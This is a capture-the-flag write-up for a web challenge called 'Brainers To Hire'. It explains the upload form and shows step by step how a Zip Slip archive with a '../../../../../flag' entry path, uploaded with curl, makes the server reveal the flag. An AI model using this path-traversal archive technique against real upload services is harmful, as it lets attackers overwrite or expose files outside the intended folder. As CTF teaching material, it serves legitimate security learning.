
# Brainers To Hire

* Category: Web
* 100 points

## Description

> Layoffs are worldwide, but we're strong, have terrific customers, and have lots of money.
> 
> So if you are unsatisfied with what you do, or you just like to be a millionaire upload your resume!

## Solution

Didn't solve this one during the CTF, got the intended solution from the admin (🙏).

A website was attached. The interesting part was:

```html
<div class="container">
  <h1 class="banner_taital">Adventure</h1>
  <p class="banner_text">
    Layoffs are worldwide, but we're strong, have terrific customers, and have lots of money.So if you are unsatisfied with what you do, every company meeting is a slippery slope.If your colleagues are not your cup of tea, or you just like to be a millionaire zip it and join us!
  </p>                                                
  <form id="upload_form" name="upload_form" method="post" enctype="multipart/form-data">
    <div class="read_bt">                              
        <input type="file" name="uploaded_file" onchange="handle_file()" placeholder="resume.." id="uploaded_file">                           
    </div>                           
  </form>                           
  <p class="banner_text" id="upload_status"></p>  
</div>
```

What we have here is a form to upload a file, and a clear hint towards `zip` files.

In addition, we have:

```javascript
var form = document.getElementById("upload_form");
    function handle_file() {
    var status = document.getElementById("upload_status");
    var data = new FormData(form);
    fetch(form.action, {
    method: form.method,
    body: data,
    headers: {
      'Accept': 'application/json'
    }
    }).then(response => {
          response.json()
      .then((data)=>{
          if (data.flag)
            status.innerHTML = data.flag;
          else
            status.innerHTML = "Thanks for your submission!" ;
      form.reset()
      })         
    }).catch(error => {
    status.innerHTML = "Oops! There was a problem submitting your form"
    });
    return false;   
}
```

We can see that if we trigger the flow on the server side to reveal the flag, we'll get it back in the response to the form upload.

For standard uploads, we get:

```console
┌──(user@kali)-[/media/…/2/3/4/5]
└─$ curl -F "uploaded_file=@test.zip" 'https://brainerstohire.appsecil.ctf.today/career'
{"msg":"success","status":"ok"}
```

The vulnerability behind this challenge is [Zip Slip](https://security.snyk.io/research/zip-slip-vulnerability). 
This vulnerability allows attackers to override / leak files outside the base folder which is supposed to contain the extracted files.

In our case we'll try to access `/flag` using the following technique:

```console
┌──(user@kali)-[/media/…/2/3/4/5]
└─$ echo FakeFlag > ../../../../../flag

┌──(user@kali)-[/media/…/2/3/4/5]
└─$  zip exploit1.zip ../../../../../flag
  adding: ../../../../../flag (stored 0%)
```

Once the application tries to extract `exploit1.zip`, the archived file would supposedly get extracted to `../../../../../flag`. Hopefully we're deep enough so that the path is equivalent to `/flag`.

Let's upload it:

```console
┌──(user@kali)-[/media/…/2/3/4/5]
└─$ curl -F "uploaded_file=@exploit1.zip" 'https://brainerstohire.appsecil.ctf.today/career'
{"msg":"success","status":"ok","flag":"AppSec-IL{z1p_5l1p_is_a_5l1pp3ry_5l0p3}\n"}
```

In a real world scenario, `/flag` would probably have gotten overridden by the contents of our file though.